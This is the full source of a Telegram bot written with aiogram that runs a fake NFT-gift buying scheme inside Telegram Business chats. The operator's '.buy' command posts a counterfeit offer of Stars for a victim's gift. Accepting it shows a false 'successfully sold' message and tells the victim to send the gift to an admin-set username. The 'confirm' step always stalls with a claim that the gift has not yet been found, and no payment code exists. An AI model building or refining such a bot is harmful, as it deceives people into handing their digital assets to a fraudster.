import asyncio
import logging
import os
import aiosqlite
from aiohttp import web

from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    Message, CallbackQuery, LinkPreviewOptions
)
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН")
ADMIN_ID = int(os.getenv("ADMIN_ID", 123456789)) # Ваш ID
WEBHOOK_HOST = os.getenv("RENDER_EXTERNAL_URL", "")
WEBHOOK_PATH = "/webhook"
WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
PORT = int(os.getenv("PORT", 8080))
DB_NAME = "bot_database.db"

# Словарь эмодзи по умолчанию (ключ: [текст по умолчанию, ID премиум])
DEFAULT_EMOJIS = {
    "star": ["⭐", None],       # Звезда
    "gift": ["🎁", None],       # Подарок (успешно продан)
    "decline": ["❌", None],    # Отклонить
    "accept": ["✅", None],     # Принять
    "transfer": ["➡️", None],   # Передать NFT
    "how_to": ["❓", None],     # Как передать
    "confirm": ["✅", None],    # Подтвердить передачу
    "help_doc": ["📄", None],   # Инструкция
    "ru_flag": ["🇷🇺", None],   # Флаг РФ
    "eng_flag": ["🇬🇧", None],  # Флаг Англии
    "tools": ["🛠", None],      # Параметры
    "clock": ["⏳", None]       # Ожидание
}

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        # Настройки
        await db.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        # Шаблоны
        await db.execute('''CREATE TABLE IF NOT EXISTS templates (id INTEGER PRIMARY KEY AUTOINCREMENT, text TEXT)''')
        # Эмодзи
        await db.execute('''CREATE TABLE IF NOT EXISTS emojis (key TEXT PRIMARY KEY, emoji_id TEXT)''')
        
        # Инициализация
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('target_username', 'Gifter_Manager')")
        await db.commit()

async def get_setting(key: str):
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else None

async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
        await db.commit()

# --- ХЕЛПЕРЫ ДЛЯ ЭМОДЗИ ---
async def get_emoji_id(key: str):
    """Возвращает ID премиум эмодзи, если он задан."""
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT emoji_id FROM emojis WHERE key = ?", (key,)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row and row[0] else None

async def get_emoji_text(key: str):
    """Возвращает HTML-тег для текста с премиум эмодзи (если задан) или обычный эмодзи."""
    emoji_id = await get_emoji_id(key)
    fallback = DEFAULT_EMOJIS[key][0]
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

async def get_button_emoji(key: str):
    """Возвращает ID эмодзи для кнопки или None."""
    return await get_emoji_id(key)

# --- СОСТОЯНИЯ FSM ---
class AdminStates(StatesGroup):
    waiting_for_username = State()
    waiting_for_emoji_id = State()
    waiting_for_template = State()

# --- ИНИЦИАЛИЗАЦИЯ ---
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- ГЕНЕРАТОРЫ КЛАВИАТУР ---
async def get_offer_keyboard(giver_username: str):
    decline_id = await get_button_emoji("decline")
    accept_id = await get_button_emoji("accept")
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data=f"decline_{giver_username}", icon_custom_emoji_id=decline_id),
            InlineKeyboardButton(text="Принять", callback_data=f"accept_{giver_username}", icon_custom_emoji_id=accept_id)
        ]
    ])

async def get_success_keyboard(target_username: str):
    transfer_id = await get_button_emoji("transfer")
    how_to_id = await get_button_emoji("how_to")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
        [InlineKeyboardButton(text="Как передать?", callback_data="how_to_transfer", icon_custom_emoji_id=how_to_id)]
    ])

async def get_instruction_keyboard(target_username: str):
    transfer_id = await get_button_emoji("transfer")
    confirm_id = await get_button_emoji("confirm")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать подарок", url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
        [InlineKeyboardButton(text="Подтвердить передачу", callback_data="confirm_transfer", icon_custom_emoji_id=confirm_id)]
    ])

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить юзернейм получателя", callback_data="admin_set_user")],
        [InlineKeyboardButton(text="Управление премиум-эмодзи", callback_data="admin_emojis")],
        [InlineKeyboardButton(text="Создать шаблон (.shab)", callback_data="admin_create_tpl")]
    ])

# --- ОБРАБОТЧИКИ БИЗНЕС-ЧАТОВ ---

@router.message(F.text == ".help")
async def show_help(message: Message):
    e_doc = await get_emoji_text("help_doc")
    e_ru = await get_emoji_text("ru_flag")
    e_eng = await get_emoji_text("eng_flag")
    e_tools = await get_emoji_text("tools")
    
    text = (
        f"{e_doc} <b>Инструкция по созданию предложения</b>\n\n"
        "Отправь команду в подключённом чате Telegram Business в следующем формате:\n\n"
        "<code>.buy язык ссылка сумма валюта</code>\n\n"
        f"{e_ru} <b>Пример на русском:</b>\n"
        "<code>.buy ru https://t.me/nft/Model-328434 1500 stars</code>\n\n"
        f"{e_eng} <b>Пример на английском:</b>\n"
        "<code>.buy eng https://t.me/nft/Model-328434 1500 stars</code>\n\n"
        f"{e_tools} <b>Параметры:</b>\n"
        "• <code>ru</code> — русский язык\n"
        "• <code>eng</code> — английский язык\n"
        "• <code>ссылка</code> — ссылка на подарок\n"
        "• <code>1500</code> — сумма предложения\n"
        "• <code>stars</code> — валюта Stars\n"
        "• <code>gram</code> — валюта GRAM\n\n"
        "Или используйте шаблон:\n"
        "<code>.shab [номер]</code>"
    )
    if message.business_connection_id:
        await message.reply(text)
    else:
        await message.answer(text)

@router.business_message(F.text.startswith(".buy"))
async def process_buy_command(message: Message):
    args = message.text.split()
    if len(args) < 5:
        await message.reply("❌ Неверный формат. Используйте <code>.buy ru [ссылка] [сумма] [валюта]</code>")
        return
    
    lang, link, amount, currency = args[1], args[2], args[3], args[4]
    
    # Красивое имя для ссылки (например, BowTie #51908)
    nft_name = link.split("/")[-1].replace("-", " #") if "/" in link else "NFT"
    # Делаем гиперссылку
    link_html = f'<a href="{link}">{nft_name}</a>'
    
    e_star = await get_emoji_text("star")
    giver_username = message.from_user.username or message.from_user.first_name
    
    text = (
        f"Пользователь <b>{giver_username}</b> предлагает\n"
        f"Вам <b>{amount}</b> {e_star} звёзд за подарок\n"
        f"<b>{link_html}</b>.\n\n" # Гиперссылка
        f"Предложение действует ещё 6ч."
    )
    
    # Превью ссылки наверху сообщения
    link_preview = LinkPreviewOptions(url=link, show_above_text=True)
    
    await message.reply(text, reply_markup=await get_offer_keyboard(giver_username), link_preview_options=link_preview)
    try:
        await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception:
        pass

# --- ОБРАБОТЧИКИ КНОПОК ---

@router.callback_query(F.data.startswith("decline_"))
async def decline_offer(callback: CallbackQuery):
    await callback.message.edit_text(text="❌ <b>Предложение отклонено.</b>", reply_markup=None)
    await callback.answer("Вы отклонили предложение.")

@router.callback_query(F.data.startswith("accept_"))
async def accept_offer(callback: CallbackQuery):
    await callback.answer(
        "После принятия следуйте инструкциям бота для дальнейших действий.\n\n"
        "Если вы всё прочитали и ознакомились, нажмите «ОК».",
        show_alert=True
    )
    
    target_username = await get_setting("target_username")
    e_gift = await get_emoji_text("gift")
    
    # Для сохранения превью наверху при редактировании, передаем url из кнопки
    # Но так как мы нажали кнопку, мы не знаем оригинальную ссылку. 
    # В реальном боте её лучше сохранять в БД при создании оффера. 
    # Пока для простоты берем первое сообщение.
    # (Если превью не нужно при редактировании - можно убрать)
    text = (
        f"{e_gift} Подарок: <b>BowTie #51908</b>\n" # Здесь можно динамически подставлять имя
        "успешно продан!\n\n"
        "<b>Передайте подарок</b>\n"
        "<b>покупателю для зачисления</b>\n"
        "<b>звёзд.</b>"
    )
    await callback.message.edit_text(text, reply_markup=await get_success_keyboard(target_username))

@router.callback_query(F.data == "how_to_transfer")
async def how_to_transfer(callback: CallbackQuery):
    target_username = await get_setting("target_username")
    
    text = (
        "<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю\n"
        f"@{target_username}.\n"
        "2. Нажмите «Передать подарок» и\n"
        "выберите <b>Chill Flame #292858</b>.\n"
        "3. Подтвердите передачу подарка.\n\n"
        "Предложение действительно 24 часа."
    )
    await callback.message.edit_text(text, reply_markup=await get_instruction_keyboard(target_username))

@router.callback_query(F.data == "confirm_transfer")
async def confirm_transfer(callback: CallbackQuery):
    e_clock = await get_emoji_text("clock")
    await callback.answer(
        f"{e_clock} Подарок пока не найден на аккаунте. Ожидайте автоматической проверки.",
        show_alert=True
    )

# --- АДМИН ПАНЕЛЬ ---
@router.message(Command("admin"), F.from_user.id == ADMIN_ID)
async def admin_panel(message: Message):
    await message.answer("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())

@router.callback_query(F.data == "admin_set_user", F.from_user.id == ADMIN_ID)
async def admin_set_user(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите новый юзернейм получателя (без @):")
    await state.set_state(AdminStates.waiting_for_username)
    await callback.answer()

@router.message(AdminStates.waiting_for_username, F.from_user.id == ADMIN_ID)
async def process_username(message: Message, state: FSMContext):
    await set_setting("target_username", message.text)
    await message.answer(f"✅ Юзернейм изменен на @{message.text}")
    await state.clear()

# --- УПРАВЛЕНИЕ ЭМОДЗИ ---
@router.callback_query(F.data == "admin_emojis", F.from_user.id == ADMIN_ID)
async def admin_emojis_menu(callback: CallbackQuery):
    kb = []
    for key, (fallback, _) in DEFAULT_EMOJIS.items():
        e_id = await get_emoji_id(key)
        status = "✅ Вкл" if e_id else "❌ Выкл"
        kb.append([InlineKeyboardButton(text=f"{fallback} {key} — {status}", callback_data=f"edit_emoji_{key}")])
    kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
    await callback.message.edit_text("Управление премиум-эмодзи:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await callback.answer()

@router.callback_query(F.data.startswith("edit_emoji_"), F.from_user.id == ADMIN_ID)
async def edit_emoji(callback: CallbackQuery, state: FSMContext):
    key = callback.data.split("_")[2]
    fallback = DEFAULT_EMOJIS[key][0]
    await state.update_data(emoji_key=key)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗑 Отключить (сбросить)", callback_data=f"reset_emoji_{key}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_emojis")]
    ])
    
    await callback.message.edit_text(
        f"Настройка эмодзи: {fallback}\n\n"
        "Отправьте ID премиум-эмодзи (только цифры), чтобы включить его.\n"
        "Или нажмите кнопку ниже, чтобы отключить и вернуть обычный эмодзи.", 
        reply_markup=kb
    )
    await state.set_state(AdminStates.waiting_for_emoji_id)
    await callback.answer()

@router.callback_query(F.data.startswith("reset_emoji_"), F.from_user.id == ADMIN_ID)
async def reset_emoji(callback: CallbackQuery, state: FSMContext):
    key = callback.data.split("_")[2]
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("DELETE FROM emojis WHERE key = ?", (key,))
        await db.commit()
    await callback.answer("✅ Эмодзи отключен!")
    await admin_emojis_menu(callback)

@router.message(AdminStates.waiting_for_emoji_id, F.from_user.id == ADMIN_ID)
async def process_emoji_id(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ ID должен состоять только из цифр. Попробуйте еще раз.")
        return
        
    data = await state.get_data()
    key = data.get("emoji_key")
    
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("INSERT OR REPLACE INTO emojis (key, emoji_id) VALUES (?, ?)", (key, message.text))
        await db.commit()
        
    await message.answer(f"✅ Премиум-эмодзи для '{key}' успешно обновлен!\nТеперь он включен.", reply_markup=get_admin_keyboard())
    await state.clear()

@router.callback_query(F.data == "admin_back", F.from_user.id == ADMIN_ID)
async def admin_back(callback: CallbackQuery):
    await callback.message.edit_text("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())

# --- ШАБЛОНЫ ---
@router.callback_query(F.data == "admin_create_tpl", F.from_user.id == ADMIN_ID)
async def admin_create_tpl(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите текст шаблона (можно использовать HTML):")
    await state.set_state(AdminStates.waiting_for_template)
    await callback.answer()

@router.message(AdminStates.waiting_for_template, F.from_user.id == ADMIN_ID)
async def process_template(message: Message, state: FSMContext):
    async with aiosqlite.connect(DB_NAME) as db:
        cursor = await db.execute("INSERT INTO templates (text) VALUES (?)", (message.html_text,))
        tpl_id = cursor.lastrowid
        await db.commit()
    await message.answer(f"✅ Шаблон создан! Чтобы вызвать его, напишите в бизнес-чат:\n<code>.shab {tpl_id}</code>", reply_markup=get_admin_keyboard())
    await state.clear()

@router.business_message(F.text.startswith(".shab"))
async def process_shab_command(message: Message):
    args = message.text.split()
    if len(args) < 2:
        await message.reply("❌ Укажите номер шаблона: <code>.shab 1</code>")
        return
    
    tpl_id = args[1]
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT text FROM templates WHERE id = ?", (tpl_id,)) as cursor:
            row = await cursor.fetchone()
            
    if row:
        await message.reply(row[0], parse_mode=ParseMode.HTML)
    else:
        await message.reply("❌ Шаблон с таким номером не найден.")

# --- ВЕБХУК ДЛЯ RENDER ---
async def on_startup(bot: Bot):
    await init_db()
    if WEBHOOK_HOST:
        await bot.set_webhook(WEBHOOK_URL)
        logging.info(f"Webhook set to {WEBHOOK_URL}")

async def on_shutdown(bot: Bot):
    if WEBHOOK_HOST:
        await bot.delete_webhook()

def main():
    logging.basicConfig(level=logging.INFO)
    app = web.Application()
    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    web.run_app(app, host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()
